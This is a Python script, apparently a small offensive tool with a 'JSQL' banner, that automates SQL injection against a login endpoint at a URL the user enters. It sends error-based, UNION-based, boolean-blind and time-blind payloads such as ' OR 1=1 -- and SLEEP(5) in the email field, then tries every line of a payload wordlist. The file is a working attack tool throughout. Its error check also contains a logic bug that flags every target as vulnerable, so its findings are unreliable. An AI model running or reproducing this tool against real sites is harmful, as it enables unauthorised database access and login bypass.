import requests
from time import time, sleep
import os
from colorama import Fore, Style, init

init(autoreset=True)

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0'
}

# Banner
def display_banner():
    banner = """

     ██╗███████╗ ██████╗ ██╗
     ██║██╔════╝██╔═══██╗██║
     ██║███████╗██║   ██║██║
██   ██║╚════██║██║▄▄ ██║██║
╚█████╔╝███████║╚██████╔╝███████╗
 ╚════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                   
    """
    print(Fore.RED + banner)

# Load payloads from file
def load_payloads(filename):
    if os.path.exists(filename):
        with open(filename, 'r', errors='ignore') as file:
            return [line.strip() for line in file.readlines()]
    else:
        print(Fore.RED + f"[-] Payload file {filename} not found.")
        return []

# Error-based SQL Injection Check
def is_vulnerable_to_sql_injection(base_url):
    print(Fore.BLUE + "[*] Checking if the website is vulnerable to SQL Injection (Error-based)...")
    test_payload = "' OR 1=1 --"
    login_url = f'{base_url}'
    data = {"email": test_payload, "password": "test"}

    # Common error patterns for different databases
    error_based_patterns = [
        "you have an error in your SQL syntax",     # MySQL
        "unclosed quotation mark",                  # SQL Server
        "SQL command not properly ended",           # Oracle
        "ORA-",                                     # Oracle specific error
        "PostgreSQL query failed"                   # PostgreSQL
    ]

    try:
        response = requests.post(login_url, json=data, headers=headers, allow_redirects=False)
        
        # Check if response contains any SQL error messages
        if any(pattern in response.text.lower() for pattern in error_based_patterns):
            print(Fore.GREEN +"[+] The website is vulnerable to SQL Injection (Error-based).")
            return True
        elif response.status_code == 500 or 503:
            print(Fore.GREEN +"[+] The website is potentially vulnerable (Error-based response code detected).")
            return True
        else:
            print(Fore.RED + "[-] The website is not vulnerable to SQL Injection.")
            return False
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Request failed: {e}")
        return False

# Perform Union-based SQL Injection
def union_based_injection(base_url):
    print(Fore.BLUE + "[*] Attempting UNION-based SQL Injection...")
    for i in range(1, 10):  # Test up to 10 columns
        payload = f"' UNION SELECT " + ", ".join(["NULL"] * i) + " -- "
        data = {"email": payload, "password": "test"}
        response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
        if response.status_code == 200 and "NULL" not in response.text:
            print(Fore.GREEN +f"[+] UNION-based SQL Injection Successful with {i} columns!")
            break
        #else:
            #print(Fore.RED + f"[-] UNION-based SQL Injection Failed with {i} columns.")

# Perform Boolean-based Blind SQL Injection
def boolean_based_blind_sql_injection(base_url):
    print(Fore.BLUE + "[*] Attempting Boolean-based Blind SQL Injection...")
    true_payload = "' AND 1=1 -- "
    false_payload = "' AND 1=2 -- "

    # Testing with True condition
    true_response = requests.post(base_url, json={"email": true_payload, "password": "test"}, headers=headers, allow_redirects=False)
    # Testing with False condition
    false_response = requests.post(base_url, json={"email": false_payload, "password": "test"}, headers=headers, allow_redirects=False)

    if true_response.status_code == 200 and false_response.status_code != 200:
        print(Fore.GREEN +"[+] Boolean-based Blind SQL Injection Successful!")
    else:
        print(Fore.RED + "[-] Boolean-based Blind SQL Injection Failed.")

# Perform Time-based Blind SQL Injection
def time_based_blind_sql_injection(base_url):
    print(Fore.BLUE + "[*] Attempting Time-based Blind SQL Injection...")
    sleep_payload = "'; IF(1=1, SLEEP(5), SLEEP(0)) -- "
    start_time = time()

    response = requests.post(base_url, json={"email": sleep_payload, "password": "test"}, headers=headers, allow_redirects=False)
    end_time = time()

    if end_time - start_time > 5:
        print(Fore.GREEN +"[+] Time-based Blind SQL Injection Successful!")
    else:
        print(Fore.RED + "[-] Time-based Blind SQL Injection Failed.")

# SQL Injection Attack Automation
def sql_injection_attack(base_url):
    # Load SQL injection payloads from file
    sql_payloads = input(Fore.BLUE + "Enter the target payloads word list path: ")
    payloads = load_payloads(sql_payloads)

    print(Fore.BLUE + "[*] Attempting SQL Injection with various payloads...")
    for payload in payloads:
        data = {"email": payload, "password": "test"}
        response = requests.post(base_url, json=data, headers=headers, allow_redirects=False)
        if response.status_code == 200 and "authentication" in response.text:
            print(Fore.GREEN +f"[+] SQL Injection Successful with payload: {payload}")
        #else:
            #print(Fore.RED + f"[-] SQL Injection Failed with payload: {payload}")
            

# Main function to run all types of attacks
def main():
    display_banner()
    base_url = input(Fore.BLUE + "Enter the target URL: ")
    
    # Error-based SQL injection
    if is_vulnerable_to_sql_injection(base_url):
        # Perform UNION-based SQL Injection
        union_based_injection(base_url)

        # Perform Boolean-based Blind SQL Injection
        boolean_based_blind_sql_injection(base_url)

        # Perform Time-based Blind SQL Injection
        time_based_blind_sql_injection(base_url)

        # Perform SQL Injection with different payloads
        sql_injection_attack(base_url)

if __name__ == '__main__':
    main()
